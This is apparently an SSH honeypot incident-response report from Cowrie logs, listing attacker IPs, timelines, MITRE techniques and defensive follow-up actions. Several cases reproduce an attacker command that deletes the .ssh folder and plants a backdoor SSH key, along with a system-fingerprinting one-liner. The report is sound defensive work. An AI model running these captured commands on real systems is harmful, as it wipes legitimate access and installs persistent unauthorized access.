| `2026-10-18 02:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f16ce0c287bc

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-10-18 02:22 |
| **Last Seen** | 2026-10-18 02:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:22:31` | `cowrie.session.connect` |
| `2026-10-18 02:22:31` | `cowrie.client.version` |
| `2026-10-18 02:22:31` | `cowrie.client.kex` |
| `2026-10-18 02:22:33` | `cowrie.login.success` |
| `2026-10-18 02:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e70b0f2cb21

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-10-18 02:22 |
| **Last Seen** | 2026-10-18 02:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:22:47` | `cowrie.session.connect` |
| `2026-10-18 02:22:47` | `cowrie.client.version` |
| `2026-10-18 02:22:47` | `cowrie.client.kex` |
| `2026-10-18 02:22:47` | `cowrie.login.success` |
| `2026-10-18 02:22:48` | `cowrie.session.params` |
| `2026-10-18 02:22:48` | `cowrie.command.input` |
| `2026-10-18 02:22:48` | `cowrie.command.failed` |
| `2026-10-18 02:22:48` | `cowrie.log.closed` |
| `2026-10-18 02:22:49` | `cowrie.session.params` |
| `2026-10-18 02:22:49` | `cowrie.command.input` |
| `2026-10-18 02:22:49` | `cowrie.session.file_download` |
| `2026-10-18 02:22:49` | `cowrie.log.closed` |
| `2026-10-18 02:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57e30b18a97

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-10-18 02:22 |
| **Last Seen** | 2026-10-18 02:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:22:49` | `cowrie.session.connect` |
| `2026-10-18 02:22:49` | `cowrie.client.version` |
| `2026-10-18 02:22:49` | `cowrie.client.kex` |
| `2026-10-18 02:22:49` | `cowrie.login.success` |
| `2026-10-18 02:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f588ff6a89f8

| Field | Detail |
|---|---|
| **Source IP** | `165.227.57[.]193` |
| **First Seen** | 2026-10-18 02:23 |
| **Last Seen** | 2026-10-18 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:23:41` | `cowrie.session.connect` |
| `2026-10-18 02:23:41` | `cowrie.client.version` |
| `2026-10-18 02:23:41` | `cowrie.client.kex` |
| `2026-10-18 02:23:41` | `cowrie.login.success` |
| `2026-10-18 02:23:42` | `cowrie.session.params` |
| `2026-10-18 02:23:42` | `cowrie.command.input` |
| `2026-10-18 02:23:42` | `cowrie.log.closed` |
| `2026-10-18 02:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.57[.]193` to AbuseIPDB if not already reported
- [ ] Block `165.227.57[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a03ab8834db9

| Field | Detail |
|---|---|
| **Source IP** | `103.69.96[.]120` |
| **First Seen** | 2026-10-18 02:35 |
| **Last Seen** | 2026-10-18 02:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:35:45` | `cowrie.session.connect` |
| `2026-10-18 02:35:45` | `cowrie.client.version` |
| `2026-10-18 02:35:45` | `cowrie.client.kex` |
| `2026-10-18 02:35:46` | `cowrie.login.success` |
| `2026-10-18 02:35:47` | `cowrie.session.params` |
| `2026-10-18 02:35:47` | `cowrie.command.input` |
| `2026-10-18 02:35:47` | `cowrie.command.failed` |
| `2026-10-18 02:35:48` | `cowrie.log.closed` |
| `2026-10-18 02:35:49` | `cowrie.session.params` |
| `2026-10-18 02:35:49` | `cowrie.command.input` |
| `2026-10-18 02:35:49` | `cowrie.session.file_download` |
| `2026-10-18 02:35:49` | `cowrie.log.closed` |
| `2026-10-18 02:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.69.96[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.69.96[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d8367ab6fb

| Field | Detail |
|---|---|
| **Source IP** | `103.69.96[.]120` |
| **First Seen** | 2026-10-18 02:35 |
| **Last Seen** | 2026-10-18 02:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:35:49` | `cowrie.session.connect` |
| `2026-10-18 02:35:49` | `cowrie.client.version` |
| `2026-10-18 02:35:50` | `cowrie.client.kex` |
| `2026-10-18 02:35:51` | `cowrie.login.success` |
| `2026-10-18 02:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.69.96[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.69.96[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-569b189671e1

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]113` |
| **First Seen** | 2026-10-18 02:41 |
| **Last Seen** | 2026-10-18 02:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:41:09` | `cowrie.session.connect` |
| `2026-10-18 02:41:09` | `cowrie.client.version` |
| `2026-10-18 02:41:10` | `cowrie.client.kex` |
| `2026-10-18 02:41:11` | `cowrie.login.success` |
| `2026-10-18 02:41:12` | `cowrie.session.params` |
| `2026-10-18 02:41:12` | `cowrie.command.input` |
| `2026-10-18 02:41:12` | `cowrie.command.failed` |
| `2026-10-18 02:41:12` | `cowrie.log.closed` |
| `2026-10-18 02:41:13` | `cowrie.session.params` |
| `2026-10-18 02:41:13` | `cowrie.command.input` |
| `2026-10-18 02:41:13` | `cowrie.session.file_download` |
| `2026-10-18 02:41:13` | `cowrie.log.closed` |
| `2026-10-18 02:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057434fb0bd0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]113` |
| **First Seen** | 2026-10-18 02:41 |
| **Last Seen** | 2026-10-18 02:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:41:14` | `cowrie.session.connect` |
| `2026-10-18 02:41:14` | `cowrie.client.version` |
| `2026-10-18 02:41:14` | `cowrie.client.kex` |
| `2026-10-18 02:41:15` | `cowrie.login.success` |
| `2026-10-18 02:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7445183d92c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-18 02:56 |
| **Last Seen** | 2026-10-18 02:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:56:11` | `cowrie.session.connect` |
| `2026-10-18 02:56:11` | `cowrie.client.version` |
| `2026-10-18 02:56:11` | `cowrie.client.kex` |
| `2026-10-18 02:56:11` | `cowrie.login.success` |
| `2026-10-18 02:56:11` | `cowrie.direct-tcpip.request` |
| `2026-10-18 02:56:11` | `cowrie.direct-tcpip.data` |
| `2026-10-18 02:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96a21716a92

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-10-18 03:01 |
| **Last Seen** | 2026-10-18 03:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 03:01:35` | `cowrie.session.connect` |
| `2026-10-18 03:01:36` | `cowrie.client.version` |
| `2026-10-18 03:01:36` | `cowrie.client.kex` |
| `2026-10-18 03:01:38` | `cowrie.login.success` |
| `2026-10-18 03:01:40` | `cowrie.session.params` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.success` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| `2026-10-18 03:01:40` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc2ad2f1bfdc

| Field | Detail |
|---|---|
| **Source IP** | `70.34.202[.]108` |
| **First Seen** | 2026-10-18 03:47 |
| **Last Seen** | 2026-10-18 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 03:47:57` | `cowrie.session.connect` |
| `2026-10-18 03:47:57` | `cowrie.client.version` |
| `2026-10-18 03:47:57` | `cowrie.client.kex` |
| `2026-10-18 03:47:58` | `cowrie.login.success` |
| `2026-10-18 03:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.34.202[.]108` to AbuseIPDB if not already reported
- [ ] Block `70.34.202[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1782e1de1da2

| Field | Detail |
|---|---|
| **Source IP** | `115.190.243[.]73` |
| **First Seen** | 2026-10-18 03:51 |
| **Last Seen** | 2026-10-18 03:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 03:51:01` | `cowrie.session.connect` |
| `2026-10-18 03:51:01` | `cowrie.client.version` |
| `2026-10-18 03:51:02` | `cowrie.client.kex` |
| `2026-10-18 03:51:02` | `cowrie.login.success` |
| `2026-10-18 03:51:03` | `cowrie.session.params` |
| `2026-10-18 03:51:04` | `cowrie.command.input` |
| `2026-10-18 03:51:04` | `cowrie.command.failed` |
| `2026-10-18 03:51:04` | `cowrie.log.closed` |
| `2026-10-18 03:51:05` | `cowrie.session.params` |
| `2026-10-18 03:51:05` | `cowrie.command.input` |
| `2026-10-18 03:51:05` | `cowrie.session.file_download` |
| `2026-10-18 03:51:05` | `cowrie.log.closed` |
| `2026-10-18 03:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.243[.]73` to AbuseIPDB if not already reported
- [ ] Block `115.190.243[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aca901fa440

| Field | Detail |
|---|---|
| **Source IP** | `115.190.243[.]73` |
| **First Seen** | 2026-10-18 03:51 |
| **Last Seen** | 2026-10-18 03:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 03:51:05` | `cowrie.session.connect` |
| `2026-10-18 03:51:05` | `cowrie.client.version` |
| `2026-10-18 03:51:06` | `cowrie.client.kex` |
| `2026-10-18 03:51:07` | `cowrie.login.success` |
| `2026-10-18 03:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.243[.]73` to AbuseIPDB if not already reported
- [ ] Block `115.190.243[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (142) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-362d65bd2282 | HIGH | `170.106.194[.]247` | 2026-10-18 03:56 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-6715cf4c0824 | HIGH | `115.191.27[.]238` | 2026-10-18 03:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-475bf2c23b79 | HIGH | `115.191.27[.]238` | 2026-10-18 03:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dc6be9c59df7 | HIGH | `85.198.19[.]239` | 2026-10-18 04:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dd71c3e5b317 | HIGH | `85.198.19[.]239` | 2026-10-18 04:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74e21556fdfb | HIGH | `176.53.159[.]196` | 2026-10-18 04:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7c0cbc247c84 | HIGH | `109.91.4[.]177` | 2026-10-18 04:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-147b46f7187d | HIGH | `109.91.4[.]177` | 2026-10-18 04:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8f7d48855206 | HIGH | `156.232.13[.]246` | 2026-10-18 04:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-19dfebacf435 | HIGH | `156.232.13[.]246` | 2026-10-18 04:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-062d402add08 | HIGH | `124.174.39[.]136` | 2026-10-18 04:26 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-5a6d2db354eb | HIGH | `124.174.39[.]136` | 2026-10-18 04:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-44261ec9861b | HIGH | `184.105.139[.]67` | 2026-10-18 04:49 | Y | 3 | 0 | `T1078` |
| IR-4fcae73644df | HIGH | `156.239.236[.]204` | 2026-10-18 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bd4e8972e359 | HIGH | `156.239.236[.]204` | 2026-10-18 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-621c0195b212 | HIGH | `34.77.30[.]113` | 2026-10-18 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d469f3020bbf | HIGH | `201.63.223[.]138` | 2026-10-18 05:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eaa6ed210ccb | HIGH | `201.63.223[.]138` | 2026-10-18 05:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0a92d04c0e12 | HIGH | `177.136.224[.]34` | 2026-10-18 05:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d8ffb159b376 | HIGH | `177.136.224[.]34` | 2026-10-18 05:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b6fba4eb21ce | HIGH | `89.252.133[.]230` | 2026-10-18 05:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c4f6e5f06088 | HIGH | `89.252.133[.]230` | 2026-10-18 05:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-08fcadd5e06d | HIGH | `211.178.247[.]182` | 2026-10-18 05:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8e61bd67d43d | HIGH | `211.178.247[.]182` | 2026-10-18 05:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-caee4e6f0709 | HIGH | `47.77.209[.]132` | 2026-10-18 05:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b7e5511a4bb1 | HIGH | `130.12.180[.]51` | 2026-10-18 05:49 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-63bd782a20e0 | HIGH | `120.48.84[.]2` | 2026-10-18 05:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c6bff7b33384 | HIGH | `120.48.84[.]2` | 2026-10-18 05:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-798cfd5849c1 | HIGH | `111.229.113[.]31` | 2026-10-18 06:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7c8c8ff303b7 | HIGH | `130.12.180[.]51` | 2026-10-18 06:07 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-dcd7f7db9c12 | HIGH | `109.160.32[.]48` | 2026-10-18 06:38 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0f5d4a29d481 | HIGH | `2.57.122[.]150` | 2026-10-18 06:39 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-9643235b4e1f | HIGH | `176.53.159[.]196` | 2026-10-18 06:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74b811e5a355 | HIGH | `195.178.110[.]218` | 2026-10-18 07:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-76f885371814 | HIGH | `96.78.175[.]36` | 2026-10-18 07:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ede830e14eae | HIGH | `96.78.175[.]36` | 2026-10-18 07:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8e4afbfd6ba8 | HIGH | `135.237.122[.]43` | 2026-10-18 07:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a580ac450f10 | HIGH | `135.237.122[.]43` | 2026-10-18 07:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c505760f2215 | HIGH | `20.157.117[.]15` | 2026-10-18 07:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e91b2c2b33dd | HIGH | `20.157.117[.]15` | 2026-10-18 07:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e5b3d80a8183 | HIGH | `207.175.32[.]84` | 2026-10-18 07:22 | Y | 2 | 0 | `T1078` |
| IR-1a99cdeb9dd5 | HIGH | `207.175.32[.]84` | 2026-10-18 07:22 | Y | 1 | 0 | `T1078` |
| IR-b72c49f63ef0 | HIGH | `207.175.32[.]84` | 2026-10-18 07:22 | Y | 0 | 0 | `T1078` |
| IR-e12c7af83355 | HIGH | `34.62.245[.]73` | 2026-10-18 07:33 | Y | 2 | 0 | `T1078` |
| IR-b5d5e2ae8440 | HIGH | `34.62.245[.]73` | 2026-10-18 07:34 | Y | 1 | 0 | `T1078` |
| IR-28a52a452bdd | HIGH | `34.62.245[.]73` | 2026-10-18 07:34 | Y | 0 | 0 | `T1078` |
| IR-d263e50dad84 | HIGH | `117.50.119[.]132` | 2026-10-18 07:43 | Y | 1 | 0 | `T1078 · T1592` |
| IR-574b48fd1389 | HIGH | `36.50.134[.]86` | 2026-10-18 07:50 | Y | 4 | 0 | `T1078 · T1083` |
| IR-6298a40ab9f1 | HIGH | `34.22.121[.]204` | 2026-10-18 07:58 | Y | 2 | 0 | `T1078` |
| IR-2c3a66408e56 | HIGH | `34.22.121[.]204` | 2026-10-18 07:58 | Y | 1 | 0 | `T1078` |
| IR-6177e2d98ab3 | HIGH | `34.22.121[.]204` | 2026-10-18 07:58 | Y | 0 | 0 | `T1078` |
| IR-5d50b029024e | HIGH | `195.178.110[.]218` | 2026-10-18 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9e64ad8648b5 | HIGH | `2.57.122[.]150` | 2026-10-18 08:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-a380dc7dff56 | HIGH | `176.53.159[.]196` | 2026-10-18 08:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a3ac3de7de0f | HIGH | `37.120.213[.]13` | 2026-10-18 08:17 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-92810188c403 | HIGH | `101.36.107[.]233` | 2026-10-18 08:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cbd3aead81da | HIGH | `101.36.107[.]233` | 2026-10-18 08:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fc1ef453ce50 | HIGH | `171.34.139[.]222` | 2026-10-18 08:52 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-3f77c92cad7a | HIGH | `197.248.8[.]33` | 2026-10-18 08:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-29c4e5f193e1 | HIGH | `197.248.8[.]33` | 2026-10-18 08:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b20e0c967bd6 | HIGH | `45.148.10[.]61` | 2026-10-18 08:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d5eb8a29d2a1 | HIGH | `109.160.32[.]30` | 2026-10-18 08:54 | Y | 1 | 0 | `T1078 · T1592` |
| IR-267a4057ee33 | HIGH | `116.123.150[.]231` | 2026-10-18 08:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc1cffba37ee | HIGH | `116.123.150[.]231` | 2026-10-18 08:54 | Y | 0 | 0 | `T1078 · T1592` |
